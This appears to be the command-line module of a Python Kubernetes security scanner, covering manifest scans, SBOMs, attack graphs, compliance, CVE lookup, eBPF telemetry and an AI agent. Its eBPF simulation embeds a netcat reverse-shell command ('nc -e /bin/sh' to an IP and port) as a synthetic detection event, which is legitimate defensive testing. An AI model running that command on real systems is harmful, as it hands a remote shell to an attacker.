#!/usr/bin/env python3
"""
native_scanner/cli.py
=====================
Command-Line Interface for the Independent Kubernetes Native Security Scanner.
Zero-dependency, standalone CLI for manifest auditing, container SBOM generation,
Attack Path DAG analysis, regulatory compliance, admission webhook, and auto-remediation.
"""

import argparse
import json
import os
from pathlib import Path
import sys
import time
from typing import Any, Dict, List, Optional

def get_arg(args: Any, name: str, default: Any = None) -> Any:
    """Safe, typed helper to retrieve CLI argument values with fallback defaults."""
    val = getattr(args, name, default)
    return default if val is None else val

try:
    from . import __version__
except Exception:
    __version__ = "1.0.0"

# Resilient dual-mode imports (works both as a package and standalone execution)
try:
    from .scanner import NativeSecurityScanner, ScanReport
    from .container import HybridContainerLayerScanner
    from .remediate import auto_remediate_manifest, format_patch_diff
    from .attack_graph import AttackGraphEngine
    from .compliance import ComplianceFrameworkMapper, generate_markdown_certificate
    from .declarative import DeclarativeRuleEngine
    from .bundle import StandaloneBundleManager
    from .sarif import export_sarif_report
    from .dashboard import generate_html_report, start_dashboard_server
    from .webhook import run_webhook_server, generate_webhook_manifests
    from .ebpf_probe import NativeEBPFKernelProbe
    from .node_auditor import NodeAuditor
    from .iac import DockerfileScanner, TerraformKubernetesScanner
    from .cloud_iam import CloudIAMVerifier
    from .cve import CVEDatabaseEngine
    from .cluster_scanner import LiveClusterScanner
    from .gitops import GitOpsRemediator
    from .exporter import PrometheusMetricsExporter
    from .agent import SecurityAgent, LLMClient
    from .mcp_server import run_mcp_server
    from .vex import ContextualVEXEngine, export_vex_report
    from .repl import start_copilot_repl, InteractiveCopilotREPL
    from .sigstore import SigstoreVerifier
    from .simulation import ThreatSimulationEngine
    from .kubecam import KubeCamEngine, KubeCamFrame, KubeCamFilmstrip
    from .lifecycle import ContainerLifecycleOrchestrator, ContainerLifecycleReport
    from .auth import EnterpriseAuthManager, ROLE_PLATFORM_ADMIN, ROLE_SECURITY_ENGINEER, ROLE_COMPLIANCE_AUDITOR, ROLE_DEVOPS_OPERATOR
    from .fleet import FleetManager, ClusterRecord, FleetPolicy
    from .ebpf import EBPFTelemetryEngine, SIEMForwarder, KernelSecurityEvent
    from .enterprise_server import EnterpriseServer
    from .cloud_cspm import CloudCSPMEngine
    from .crds import KubernetesCRDManager
    from .storage import EnterpriseStorageEngine
    from .notifications import NotificationDispatcher, AlertPayload
    from .openapi import get_openapi_spec
except ImportError:
    from scanner import NativeSecurityScanner, ScanReport
    from container import HybridContainerLayerScanner
    from remediate import auto_remediate_manifest, format_patch_diff
    from attack_graph import AttackGraphEngine
    from compliance import ComplianceFrameworkMapper, generate_markdown_certificate
    from declarative import DeclarativeRuleEngine
    from bundle import StandaloneBundleManager
    from sarif import export_sarif_report
    from dashboard import generate_html_report, start_dashboard_server
    from webhook import run_webhook_server, generate_webhook_manifests
    from ebpf_probe import NativeEBPFKernelProbe
    from node_auditor import NodeAuditor
    from iac import DockerfileScanner, TerraformKubernetesScanner
    from cloud_iam import CloudIAMVerifier
    from cve import CVEDatabaseEngine
    from cluster_scanner import LiveClusterScanner
    from gitops import GitOpsRemediator
    from exporter import PrometheusMetricsExporter
    from agent import SecurityAgent, LLMClient
    from mcp_server import run_mcp_server
    from vex import ContextualVEXEngine, export_vex_report
    from repl import start_copilot_repl, InteractiveCopilotREPL
    from sigstore import SigstoreVerifier
    from simulation import ThreatSimulationEngine
    from kubecam import KubeCamEngine, KubeCamFrame, KubeCamFilmstrip
    from lifecycle import ContainerLifecycleOrchestrator, ContainerLifecycleReport
    from auth import EnterpriseAuthManager, ROLE_PLATFORM_ADMIN, ROLE_SECURITY_ENGINEER, ROLE_COMPLIANCE_AUDITOR, ROLE_DEVOPS_OPERATOR
    from fleet import FleetManager, ClusterRecord, FleetPolicy
    from ebpf import EBPFTelemetryEngine, SIEMForwarder, KernelSecurityEvent
    from enterprise_server import EnterpriseServer
    from cloud_cspm import CloudCSPMEngine
    from crds import KubernetesCRDManager
    from storage import EnterpriseStorageEngine
    from notifications import NotificationDispatcher, AlertPayload
    from openapi import get_openapi_spec


def print_banner():
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║               KUBERNETES NATIVE SECURITY SCANNER v{__version__:<27}║
║         Enterprise Pure-Python CNAPP & Cloud-Native Security Engine          ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")


def export_junit_xml(reports: List[ScanReport], output_path: str):
    """Exports ScanReports into standard JUnit XML test results for CI/CD systems."""
    from xml.sax.saxutils import escape
    xml_lines = ['<?xml version="1.0" encoding="UTF-8"?>']
    total_tests = sum(len(r.findings) for r in reports) or len(reports)
    total_failures = sum(len([f for f in r.findings if f.severity in ("CRITICAL", "HIGH")]) for r in reports)
    xml_lines.append(f'<testsuites tests="{total_tests}" failures="{total_failures}" name="KubernetesSecurityScan">')
    for r in reports:
        suite_name = escape(Path(r.manifest_path).name or "manifest")
        xml_lines.append(f'  <testsuite name="{suite_name}" tests="{max(1, len(r.findings))}" failures="{len(r.findings)}">')
        if not r.findings:
            xml_lines.append(f'    <testcase name="SecurityCompliance" classname="{suite_name}"/>')
        else:
            for f in r.findings:
                cname = escape(f.vuln_id)
                tname = escape(getattr(f, "title", getattr(f, "name", "Finding")))
                msg = escape(f.description)
                detail = escape(f"Severity: {f.severity}\nTarget: {f.target}\nRemediation: {f.remediation}")
                xml_lines.append(f'    <testcase name="{tname}" classname="{cname}">')
                xml_lines.append(f'      <failure message="{msg}" type="{f.severity}">{detail}</failure>')
                xml_lines.append('    </testcase>')
        xml_lines.append('  </testsuite>')
    xml_lines.append('</testsuites>')
    Path(output_path).write_text("\n".join(xml_lines), encoding="utf-8")


def emit_github_actions_annotations(reports: List[ScanReport]):
    """Emits GitHub Actions workflow commands to render inline PR annotations."""
    for r in reports:
        for f in r.findings:
            level = "error" if f.severity in ("CRITICAL", "HIGH") else "warning"
            title = getattr(f, "title", getattr(f, "name", "Security Finding"))
            file_p = r.manifest_path
            print(f"::{level} file={file_p},title=[{f.vuln_id}] {title}::{f.description} (Remediation: {f.remediation})")


def cmd_scan(args):
    target = Path(args.target)
    if not target.exists():
        print(f"Error: Target path '{target}' does not exist.", file=sys.stderr)
        return 1

    scanner = NativeSecurityScanner(
        custom_rules_dir=args.rules_dir,
        custom_rules=[args.rule_file] if args.rule_file else None,
    )

    if target.is_dir():
        print(f"[*] Scanning directory: {target} (AST 56-Taxonomy)...")
        reports = scanner.scan_directory(str(target), recursive=not args.no_recursive)
        if not reports:
            print("[!] No YAML manifests found.")
            return 0

        total_findings = sum(len(r.findings) for r in reports)
        avg_score = sum(r.compliance_score for r in reports) / len(reports)

        print(f"\n[+] Scanned {len(reports)} workloads | Total Findings: {total_findings} | Average Score: {avg_score:.1f}/100")
        print("-" * 80)
        print(f"{'WORKLOAD':<40} {'SCORE':<10} {'RISK TIER':<12} {'BLAST RADIUS':<12} {'FINDINGS'}")
        print("-" * 80)
        for r in reports:
            print(f"{r.manifest_path:<40} {r.compliance_score:<10.1f} {r.risk_tier:<12} {r.blast_radius:<12.1f} {len(r.findings)}")

        # Build directory-wide attack graph
        if args.mermaid or args.attack_graph:
            graph = scanner.build_directory_attack_graph(str(target), recursive=not args.no_recursive)
            blast = graph.calculate_cluster_blast_radius()
            print(f"\n[+] Cluster-Wide Blast Radius Index: {blast:.1f}/100")
            if args.mermaid:
                m_file = Path(args.mermaid)
                m_file.write_text(graph.to_mermaid(), encoding="utf-8")
                print(f"[✓] Mermaid Attack Graph saved to: {m_file}")

        if args.sarif:
            export_sarif_report(reports, output_path=args.sarif)
            print(f"[✓] SARIF v2.1.0 results written to: {args.sarif}")

        if args.html:
            generate_html_report(reports, output_path=args.html)
            print(f"[✓] Interactive HTML report saved to: {args.html}")

        if args.junit:
            export_junit_xml(reports, output_path=args.junit)
            print(f"[✓] JUnit XML test results saved to: {args.junit}")

        if getattr(args, "github_actions", False):
            emit_github_actions_annotations(reports)

        if args.json:
            out_json = [r.to_dict() for r in reports]
            if args.json_output:
                Path(args.json_output).write_text(json.dumps(out_json, indent=2), encoding="utf-8")
                print(f"[✓] JSON results written to: {args.json_output}")
            else:
                print(json.dumps(out_json, indent=2))

        if args.min_score and avg_score < args.min_score:
            print(f"\n[!] Security Gate FAILED: Average score {avg_score:.1f} < threshold {args.min_score}")
            return 1
        return 0

    else:
        print(f"[*] Scanning manifest: {target}...")
        report = scanner.scan_file(str(target))
        print(f"\n[+] Workload: {report.manifest_path}")
        print(f"    Compliance Score: {report.compliance_score:.1f}/100 ({report.risk_tier} Risk)")
        print(f"    Blast Radius Index: {report.blast_radius:.1f}/100")
        print(f"    Total Findings: {len(report.findings)}")

        if report.findings:
            print("\nFindings Detail:")
            for f in report.findings:
                title = getattr(f, "title", getattr(f, "name", "Finding"))
                print(f"  [{f.severity:<8}] {f.vuln_id}: {title} - {f.remediation}")

        if report.kill_chains:
            print(f"\nIdentified Exploit Kill-Chains ({len(report.kill_chains)}):")
            for kc in report.kill_chains:
                print(f"  ⚡ {' -> '.join(kc.get('path', []))} [Radius: {kc.get('blast_radius', 0):.1f}]")

        if args.mermaid and report.attack_graph_mermaid:
            m_file = Path(args.mermaid)
            m_file.write_text(report.attack_graph_mermaid, encoding="utf-8")
            print(f"[✓] Mermaid Attack Graph saved to: {m_file}")

        if args.sarif:
            export_sarif_report([report], output_path=args.sarif)
            print(f"[✓] SARIF v2.1.0 results written to: {args.sarif}")

        if args.html:
            generate_html_report([report], output_path=args.html)
            print(f"[✓] Interactive HTML report saved to: {args.html}")

        if args.junit:
            export_junit_xml([report], output_path=args.junit)
            print(f"[✓] JUnit XML test results saved to: {args.junit}")

        if getattr(args, "github_actions", False):
            emit_github_actions_annotations([report])

        if args.compliance:
            cert = report.get_compliance_certificate()
            if cert:
                print("\n" + generate_markdown_certificate(cert))
                if args.cert_output:
                    Path(args.cert_output).write_text(generate_markdown_certificate(cert), encoding="utf-8")
                    print(f"[✓] Markdown compliance certificate saved to: {args.cert_output}")

        if args.json:
            if args.json_output:
                Path(args.json_output).write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
                print(f"[✓] JSON results written to: {args.json_output}")
            else:
                print(json.dumps(report.to_dict(), indent=2))

        min_threshold = args.min_score or (75.0 if getattr(args, "ci_check", False) else None)
        if min_threshold and report.compliance_score < min_threshold:
            print(f"\n[!] Security Gate FAILED: Score {report.compliance_score:.1f} < threshold {min_threshold}")
            return 1
        return 0


def cmd_remediate(args):
    target = Path(args.target)
    if not target.exists():
        print(f"Error: Target file '{target}' does not exist.", file=sys.stderr)
        return 1

    content = target.read_text(encoding="utf-8", errors="replace")
    remediated, fixes = auto_remediate_manifest(content)

    print(f"\n[+] Auto-Remediating manifest: {target}")
    print(f"    Applied {len(fixes)} least-privilege security hardening fixes:")
    for fix in fixes:
        print(f"    ✓ {fix}")

    if getattr(args, "diff", False):
        print("\nUnified Hardening Diff:")
        print(format_patch_diff(content, remediated, str(target)))

    if getattr(args, "output", None):
        out_path = Path(args.output)
        out_path.write_text(remediated, encoding="utf-8")
        print(f"[✓] Remediated manifest saved to: {out_path}")
    elif getattr(args, "write", False):
        target.write_text(remediated, encoding="utf-8")
        print(f"[✓] In-place remediation written to: {target}")
    else:
        print(f"\n[ℹ] Dry-run preview complete. Use -w/--write to apply changes in-place or -o <file> to export.")
    return 0


def cmd_scan_image(args):
    scanner = HybridContainerLayerScanner()
    if args.tarball:
        print(f"[*] Unpacking and auditing local container tarball archive: {args.tarball}")
        report = scanner.scan_tarball(args.tarball)
    else:
        print(f"[*] Scanning container image: {args.image} (In-Memory Layer Extraction)...")
        report = scanner.scan_image(args.image)

    print(f"\n[+] Image: {report.image_name} | OS: {report.os_distro} | Packages: {report.total_packages}")
    print(f"    Scan Latency: {report.scan_latency_ms:.1f} ms | Mode: {report.execution_mode}")
    print(f"    CVE Summary: {report.critical_cves} Critical | {report.high_cves} High")

    if args.cyclonedx:
        Path(args.cyclonedx).write_text(report.to_cyclonedx_json(), encoding="utf-8")
        print(f"[✓] CycloneDX v1.5 SBOM written to: {args.cyclonedx}")

    if args.spdx:
        Path(args.spdx).write_text(report.to_spdx_json(), encoding="utf-8")
        print(f"[✓] SPDX v2.3 SBOM written to: {args.spdx}")

    if args.output:
        Path(args.output).write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
        print(f"[✓] SBOM Scan Report written to: {args.output}")

    return 0


def cmd_attack_graph(args):
    target = Path(args.target)
    scanner = NativeSecurityScanner()
    if target.is_dir():
        graph = scanner.build_directory_attack_graph(str(target))
    else:
        report = scanner.scan_file(str(target))
        print(f"[*] Workload Blast Radius: {report.blast_radius:.1f}/100")
        if report.kill_chains:
            print("\nIdentified Kill Chains:")
            for kc in report.kill_chains:
                print(f"  ⚡ {' -> '.join(kc.get('path', []))} [Radius: {kc.get('blast_radius', 0):.1f}]")
        if args.mermaid:
            Path(args.mermaid).write_text(report.attack_graph_mermaid, encoding="utf-8")
            print(f"[✓] Mermaid Attack Graph saved to: {args.mermaid}")
        return 0

    blast = graph.calculate_cluster_blast_radius()
    print(f"\n[+] Cluster Blast Radius Index: {blast:.1f}/100")
    chains = graph.find_kill_chains()
    print(f"[+] Identified Active Exploit Kill-Chains ({len(chains)}):")
    for c in chains:
        print(f"  ⚡ {' -> '.join(c.path)} (Radius: {c.blast_radius:.1f})")

    if args.mermaid:
        Path(args.mermaid).write_text(graph.to_mermaid(), encoding="utf-8")
        print(f"[✓] Mermaid Attack Graph saved to: {args.mermaid}")

    return 0


def cmd_compliance(args):
    scanner = NativeSecurityScanner()
    report = scanner.scan_file(args.target)
    cert = report.get_compliance_certificate()
    if not cert:
        print("Error: Could not evaluate regulatory compliance.", file=sys.stderr)
        return 1

    md = generate_markdown_certificate(cert)
    print("\n" + md)
    if args.output:
        Path(args.output).write_text(md, encoding="utf-8")
        print(f"\n[✓] Compliance certificate written to: {args.output}")

    return 0 if cert.overall_status != "FAIL" else 1


def cmd_bundle(args):
    mgr = StandaloneBundleManager()
    action = args.bundle_action

    if action == "export":
        out_path = Path(args.output)
        manifest = mgr.export_rules_and_data(
            output_path=out_path,
            rules_dir=Path(args.rules_dir) if args.rules_dir else None,
            cve_db_path=Path(args.cve_db) if args.cve_db else None,
        )
        print(f"\n[✓] Air-Gapped Sovereign Bundle Exported: {manifest['bundle_path']}")
        print(f"    Size: {manifest['bundle_size_kb']} KB | SHA256: {manifest['bundle_sha256']}")
        print(f"    Files Packaged: {manifest['file_count']}")
        return 0

    elif action == "verify":
        target = Path(args.target)
        valid, msg, manifest = mgr.verify_bundle(target)
        if valid:
            print(f"\n[✓] Bundle Cryptographic Integrity 100% Verified: {target}")
            print(f"    Files: {manifest.get('file_count', 0)} checked and verified.")
            for rel, sha in manifest.get("checksums", {}).items():
                print(f"    • {rel:<30} : {sha[:16]}... (OK)")
            return 0
        else:
            print(f"\n[!] Verification Failed: {msg}", file=sys.stderr)
            return 1

    elif action == "import":
        target = Path(args.target)
        dest = Path(args.destination) if args.destination else None
        try:
            res = mgr.import_bundle(target, target_dir=dest)
            print(f"\n[✓] Air-Gapped Bundle Imported Successfully from: {target}")
            for f in res["imported_files"]:
                print(f"    • Extracted: {f}")
            return 0
        except Exception as e:
            print(f"\n[!] Import Failed: {e}", file=sys.stderr)
            return 1

    return 0


def cmd_webhook(args):
    if getattr(args, "generate_config", False):
        manifest_yaml = generate_webhook_manifests(
            service_name=args.service_name or "k8s-native-scan-webhook",
            namespace=args.namespace or "kube-system",
            cert_path=args.cert,
        )
        if args.output:
            Path(args.output).write_text(manifest_yaml, encoding="utf-8")
            print(f"[✓] Webhook configurations written to: {args.output}")
        else:
            print(manifest_yaml)
        return 0

    run_webhook_server(
        port=args.port,
        host=args.host,
        cert_path=args.cert,
        key_path=args.key,
        mode=args.mode,
        min_score=args.min_score,
    )
    return 0


def cmd_node_audit(args):
    auditor = NodeAuditor(root_prefix=args.root or "")
    print(f"[*] Running CIS Kubernetes Benchmark Node & Control Plane Audit (root: '{auditor.root}')...")
    report = auditor.audit_node()

    print(f"\n[+] Node Type: {report.node_type.upper()} | Score: {report.score:.1f}/100")
    print(f"    Total Checks: {report.total_checks} | Passed: {report.passed_checks} | Failed: {report.failed_checks}")
    print("-" * 80)
    for f in report.findings:
        status_tag = f"[{f.status:<4}]"
        print(f"  {status_tag} {f.check_id:<10} {f.title} (Actual: {f.actual_value}, Expected: {f.expected_value})")

    if args.json:
        print(json.dumps(report.to_dict(), indent=2))
    if args.output:
        Path(args.output).write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
        print(f"\n[✓] Node audit report saved to: {args.output}")

    return 0 if report.failed_checks == 0 else 1


def cmd_scan_iac(args):
    target = Path(args.target)
    if not target.exists():
        print(f"Error: Target '{target}' does not exist.", file=sys.stderr)
        return 1

    if target.suffix in (".tf", ".hcl"):
        scanner = TerraformKubernetesScanner()
        report = scanner.scan_file(str(target))
    else:
        # Default to Dockerfile
        scanner = DockerfileScanner()
        report = scanner.scan_file(str(target))

    print(f"\n[+] IaC Scan Target: {report.target_path} ({report.target_type.upper()})")
    print(f"    Compliance Score: {report.compliance_score:.1f}/100 | Findings: {len(report.findings)}")
    print("-" * 80)
    for f in report.findings:
        print(f"  [{f.severity:<8}] Line {f.line_number}: {f.rule_id} - {f.title}")
        print(f"             {f.description}")
        print(f"             Fix: {f.remediation}")

    if args.output:
        Path(args.output).write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
        print(f"\n[✓] IaC scan report written to: {args.output}")

    return 0 if report.compliance_score >= (args.min_score or 70.0) else 1


def cmd_dashboard(args):
    start_dashboard_server(host=args.host, port=args.port)
    return 0


def cmd_cve(args):
    engine = CVEDatabaseEngine(db_path=Path(args.db) if args.db else None)
    if getattr(args, "sync", False):
        print("[*] Synchronizing vulnerability deltas from OSV.dev (aggregating NVD, GHSA, Debian, Alpine)...")
        synced = engine.sync_osv_dev_delta(timeout=10)
        print(f"[✓] Delta sync complete: {synced} CVE records updated.")

    if getattr(args, "lookup", None):
        pkg = args.lookup
        cves = engine.query_package_cves(pkg)
        print(f"\n[+] Package: {pkg} | Total Historical CVEs: {len(cves)}")
        print("-" * 80)
        for c in cves[:25]:
            print(f"  [{c.severity:<8}] {c.cve_id} (CVSS: {c.cvss_score:.1f}) - {c.description[:80]}")

    stats = engine.get_stats()
    print(f"\n[+] Embedded SQLite CVE Threat Intelligence:")
    print(f"    Total Historical CVEs: {stats['total_cves']}")
    print(f"    Database Path        : {stats['db_path']}")
    print(f"    Database SHA256      : {stats['sha256'][:16]}...")
    print(f"    Severity Breakdown   : {stats['by_severity']}")
    print(f"    Last Synchronized    : {stats['last_sync']}")
    return 0


def cmd_ebpf(args):
    probe = NativeEBPFKernelProbe()
    engine = EBPFTelemetryEngine()
    forwarder = SIEMForwarder(getattr(args, "format", "CEF") or "CEF")

    if getattr(args, "simulate", False):
        evt = engine.evaluate_execve_event(
            pid=4192,
            comm="nc",
            filename="/usr/bin/nc",
            args=["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
            pod_name="payment-svc-6df798",
            namespace="production",
        )
        if evt:
            forwarder.push(evt)
            if getattr(args, "cef", False) or getattr(args, "format", "").upper() == "CEF":
                print(evt.to_cef())
            elif getattr(args, "syslog", False) or getattr(args, "format", "").upper() == "RFC5424":
                print(evt.to_rfc5424_syslog())
            else:
                print(json.dumps(evt.to_dict(), indent=2))
        return 0

    avail = probe.is_kernel_bpf_available()
    print(f"\n[+] In-Tree eBPF Tracepoint Engine:")
    print(f"    Host Platform : {sys.platform}")
    print(f"    Kernel BPF    : {'AVAILABLE' if avail else 'EMULATED / SYNTHETIC'}")
    if not avail:
        print("    Info: Native Linux kernel tracepoint attachment requires Linux kernel >= 5.8 with CAP_BPF / root.")
    return 0


def cmd_cluster(args):
    scanner = LiveClusterScanner(kubeconfig=args.kubeconfig)
    print(f"[*] Connecting to Kubernetes cluster...")
    if not scanner.is_cluster_reachable():
        print("[!] Cannot reach Kubernetes cluster via kubectl or in-cluster ServiceAccount.", file=sys.stderr)
        return 1

    print(f"[*] Scanning live cluster workloads (Namespace: {args.namespace or 'ALL'})...")
    report = scanner.scan_cluster(
        namespace=args.namespace,
        remediate_dir=args.remediate_out,
        gate_threshold=args.min_score or 70.0,
    )

    print(f"\n[+] Live Cluster Security Assessment Complete:")
    print(f"    Workloads Audited  : {report.total_workloads}")
    print(f"    Cluster Score      : {report.cluster_score:.1f}/100 ({report.cluster_risk_tier} Risk)")
    print(f"    High Risk Workloads: {report.high_risk_count} | Medium: {report.medium_risk_count} | Low: {report.low_risk_count}")
    print(f"    Exploit Vetoes     : {report.veto_count}")
    print(f"    Scan Latency       : {report.scan_latency_ms:.1f}ms")

    if report.workload_results:
        print("\nLeaderboard (Worst 10 Workloads):")
        print("-" * 80)
        print(f"{'TARGET':<40} {'SCORE':<10} {'RISK':<10} {'VETO':<8} {'FINDINGS'}")
        print("-" * 80)
        for w in report.leaderboard[:10]:
            print(f"{w.workload_id:<40} {w.compliance_score:<10.1f} {w.risk_tier:<10} {'YES' if w.veto_triggered else 'NO':<8} {w.findings_count}")

    if args.output:
        Path(args.output).write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
        print(f"\n[✓] Cluster assessment report written to: {args.output}")

    if args.remediate_out:
        print(f"[✓] Hardened least-privilege manifests exported to: {args.remediate_out}")

    return 0 if report.average_score >= (args.min_score or 70.0) and report.veto_count == 0 else 1


def cmd_gitops(args):
    remediator = GitOpsRemediator(threshold=args.threshold or 70.0)
    print(f"[*] Analyzing GitOps manifests in: {args.target}...")
    plan = remediator.plan_remediation(args.target)

    print(f"\n[+] GitOps Remediation Plan:")
    print(f"    Manifests Analyzed   : {plan.total_files_analyzed}")
    print(f"    Workloads Needing Fix: {plan.failing_manifests_count}")

    if not plan.workload_diffs:
        print("    [✓] All workloads meet or exceed security threshold. No drift.")
        return 0

    print("-" * 80)
    for d in plan.workload_diffs:
        print(f"  • {d.workload_id}: {d.before_score} ➔ {d.after_score} (+{d.score_delta} pts) [{d.before_risk_tier} -> {d.after_risk_tier}]")

    if args.kustomize_out:
        created = remediator.export_kustomize_overlay(plan, args.kustomize_out)
        print(f"\n[✓] Kustomize Strategic Merge Patch Overlay exported ({len(created)} files): {args.kustomize_out}")

    if args.pr_body_out:
        Path(args.pr_body_out).write_text(plan.pr_body_markdown, encoding="utf-8")
        print(f"[✓] GitHub PR / GitLab MR markdown description written to: {args.pr_body_out}")

    if getattr(args, "in_place", False):
        mod_count = remediator.apply_in_place(plan)
        print(f"[✓] Modified {mod_count} manifest(s) directly in-place.")

    if getattr(args, "ci_check", False) and plan.failing_manifests_count > 0:
        print(f"\n[!] CI Check FAILED: {plan.failing_manifests_count} workloads fail least-privilege gate.", file=sys.stderr)
        return 1

    return 0


def cmd_export_metrics(args):
    exporter = PrometheusMetricsExporter()
    scanner = NativeSecurityScanner()
    target = Path(args.target)

    if getattr(args, "serve", False):
        exporter.start_metrics_server(str(target), port=args.port or 9108, host=args.host or "0.0.0.0")
        return 0

    if target.is_file():
        reports = [scanner.scan_file(str(target))]
    elif target.is_dir():
        reports = scanner.scan_directory(str(target))
    else:
        print(f"Error: Target path '{target}' not found.", file=sys.stderr)
        return 1

    if args.output:
        exporter.export_to_file(reports, args.output)
        print(f"[✓] Prometheus OpenMetrics exported to: {args.output}")
    else:
        print(exporter.generate_metrics(reports))
    return 0


def cmd_agent(args):
    llm = LLMClient(
        provider=getattr(args, "provider", "auto") or "auto",
        api_key=getattr(args, "api_key", None),
        model=getattr(args, "model", None),
        base_url=getattr(args, "base_url", None),
    )
    agent = SecurityAgent(llm_client=llm)

    if getattr(args, "interactive", False) or getattr(args, "prompt", None) == "chat":
        start_copilot_repl(
            target=getattr(args, "target", "."),
            provider=getattr(args, "provider", "auto") or "auto",
            model=getattr(args, "model", None),
        )
        return 0

    if getattr(args, "watch", False):
        agent.watch_cluster(
            namespace=getattr(args, "namespace", None),
            interval_seconds=getattr(args, "interval", 60) or 60,
            alert_webhook_url=getattr(args, "alert_webhook", None),
        )
        return 0

    prompt = args.prompt or "Perform an end-to-end security assessment, prune lateral false positives, and propose GitOps remediations."
    target = getattr(args, "target", None)

    print(f"[AI Agent] Initializing ReAct loop (Provider: {llm.provider}, Model: {llm.model})...")
    res = agent.reason_and_act(prompt, target=target, max_steps=getattr(args, "max_steps", 5) or 5)

    print("\n" + "=" * 80)
    print("                 AUTONOMOUS KUBERNETES SECURITY AI AGENT REPORT")
    print("=" * 80)
    print(res["final_answer"])
    print("=" * 80)
    return 0


def cmd_mcp(args):
    run_mcp_server()
    return 0


def cmd_vex(args):
    engine = ContextualVEXEngine()
    target = Path(args.target)
    if not target.exists():
        print(f"Error: Target '{target}' not found.", file=sys.stderr)
        return 1

    doc = engine.generate_vex_for_manifest(str(target), image_name=getattr(args, "image", None))

    if args.output:
        Path(args.output).write_text(doc.to_openvex_json(), encoding="utf-8")
        print(f"[✓] OpenVEX v0.2.0 document exported to: {args.output}")

    if getattr(args, "json", False):
        print(doc.to_openvex_json())
    else:
        print(engine.format_terminal_summary(doc))

    return 0


def cmd_chat(args):
    start_copilot_repl(
        target=getattr(args, "target", "."),
        provider=getattr(args, "provider", "auto") or "auto",
        model=getattr(args, "model", None),
    )
    return 0


def cmd_simulate(args):
    engine = ThreatSimulationEngine()
    rep = engine.simulate_attack_scenario(args.target)
    if getattr(args, "json", False):
        print(json.dumps(rep.to_dict(), indent=2))
    else:
        print(engine.format_simulation_table(rep))
    return 0


def cmd_verify_image(args):
    verifier = SigstoreVerifier()
    res = verifier.verify_workload_image_signature(args.image)
    if getattr(args, "json", False):
        print(json.dumps(res.to_dict(), indent=2))
    else:
        status_str = "[✓] VERIFIED" if res.verified else "[!] UNVERIFIED"
        print(f"\n{status_str} Container Image: {res.image}")
        print(f"  Digest           : {res.digest or 'None'}")
        print(f"  Signer Identity  : {res.signer_identity or 'None'}")
        print(f"  SLSA Provenance  : {'Present (Level 3)' if res.has_slsa_provenance else 'Missing'}")
        if res.error_message:
            print(f"  Verification Note: {res.error_message}")
    return 0 if res.verified else 1


def cmd_kubecam(args):
    engine = KubeCamEngine(kubeconfig=get_arg(args, "kubeconfig"))
    action = get_arg(args, "action", "snapshot")

    if action == "snapshot":
        frame = engine.capture_frame(namespace=get_arg(args, "namespace"))
        if get_arg(args, "json", False):
            print(json.dumps(frame.to_dict(), indent=2))
        else:
            print(f"\n[✓] KubeCam Security Snapshot #{frame.frame_id} Captured:")
            print(f"    - Timestamp       : {frame.timestamp}")
            print(f"    - Workloads Found : {frame.total_workloads}")
            print(f"    - Compliance Score: {frame.cluster_compliance_score:.1f}%")
            print(f"    - Blast Radius    : {frame.cluster_blast_radius:.1f}/100.0")
            print(f"    - Frame Hash      : {frame.frame_hash}")
        out_path = get_arg(args, "output")
        if out_path:
            Path(out_path).write_text(json.dumps(frame.to_dict(), indent=2), encoding="utf-8")
            print(f"[✓] Snapshot saved to: {out_path}")
        return 0

    elif action == "record":
        interval = get_arg(args, "interval", 5)
        frames_count = get_arg(args, "frames", 3)
        print(f"[*] Recording KubeCam filmstrip ({frames_count} frames, interval={interval}s)...")
        filmstrip = engine.record_time_lapse(
            interval_seconds=interval,
            total_frames=frames_count,
            namespace=get_arg(args, "namespace"),
        )
        if get_arg(args, "json", False):
            print(json.dumps(filmstrip.to_dict(), indent=2))
        else:
            print(engine.format_filmstrip_summary(filmstrip))
        out_path = get_arg(args, "output")
        if out_path:
            Path(out_path).write_text(json.dumps(filmstrip.to_dict(), indent=2), encoding="utf-8")
            print(f"[✓] Filmstrip saved to: {out_path}")
        return 0

    elif action == "kubescape":
        frame = engine.capture_frame(namespace=get_arg(args, "namespace"))
        data = engine.export_kubescape_format(frame)
        out_path = get_arg(args, "output")
        if out_path:
            Path(out_path).write_text(json.dumps(data, indent=2), encoding="utf-8")
            print(f"[✓] Kubescape-compliant ARMO report exported to: {out_path}")
        else:
            print(json.dumps(data, indent=2))
        return 0

    print(f"[!] Unrecognized kubecam action: '{action}'. Valid actions: snapshot, record, kubescape", file=sys.stderr)
    return 1


def cmd_lifecycle(args):
    orchestrator = ContainerLifecycleOrchestrator()
    target = Path(args.target)
    if not target.exists():
        print(f"Error: Target '{target}' not found.", file=sys.stderr)
        return 1

    rep = orchestrator.audit_lifecycle(
        manifest_path=str(target),
        dockerfile_path=getattr(args, "dockerfile", None),
        image_ref=getattr(args, "image", None),
        min_passing_score=getattr(args, "min_score", 75.0) or 75.0,
    )

    if getattr(args, "output", None):
        Path(args.output).write_text(json.dumps(rep.to_dict(), indent=2), encoding="utf-8")
        print(f"[✓] Container Lifecycle Audit report saved to: {args.output}")

    if getattr(args, "json", False):
        print(json.dumps(rep.to_dict(), indent=2))
    else:
        print(orchestrator.format_terminal_summary(rep))

    if getattr(args, "ci_check", False) and rep.gate_verdict == "FAILED":
        print("\n[!] CI Check FAILED: Container workload failed lifecycle security gate.", file=sys.stderr)
        return 1

    return 0


def cmd_server(args):
    host = getattr(args, "host", "0.0.0.0") or "0.0.0.0"
    port = getattr(args, "port", 8443) or 8443
    print_banner()
    print(f"[*] Starting Kubernetes Native Security Enterprise Server on http://{host}:{port} ...")
    print(f"    • Built-in Web Console : http://{host}:{port}/")
    print(f"    • Swagger UI API Docs  : http://{host}:{port}/docs")
    print(f"    • OpenAPI 3.0.3 Spec   : http://{host}:{port}/api/v1/openapi.json")
    print(f"    • Prometheus Metrics   : http://{host}:{port}/metrics")
    print(f"    • REST API Endpoints   : http://{host}:{port}/api/v1/")
    print(f"    Press Ctrl+C to stop.\n")
    server = EnterpriseServer(host=host, port=port)
    server.start(background=False)
    return 0


def cmd_docs(args):
    spec = get_openapi_spec()
    out = getattr(args, "output", None)
    if out:
